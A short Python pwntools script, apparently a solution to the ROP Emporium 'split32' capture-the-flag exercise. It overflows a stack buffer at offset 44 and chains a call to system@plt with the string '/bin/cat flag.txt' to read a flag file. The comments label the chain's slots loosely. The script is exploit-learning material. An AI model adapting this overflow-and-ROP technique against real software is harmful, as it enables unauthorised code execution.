#!/usr/bin/python
from pwn import *
import struct

# rabin2 -z split32
# 004 0x00000747 0x08048747   7   8 (.rodata) ascii /bin/ls
# 000 0x00001030 0x0804a030  17  18 (.data) ascii /bin/cat flag.txt

# rabin2 -i split32
#    4 0x08048430  GLOBAL    FUNC system

elf = ELF('split32')

pad  = 'A'*44 # EIP overwrite @ 44
ropchain  = struct.pack('<L', 0x08048430) # usefulFunction -> call system@plt
ropchain += struct.pack('<L', 0x0804a039) # flag.txt
ropchain += struct.pack('<L', 0x0804a030) # /bin/cat
exploit = pad + ropchain

io = process(elf.path)
io.recv()
io.sendline(exploit)

flag = io.recv()
success(flag)
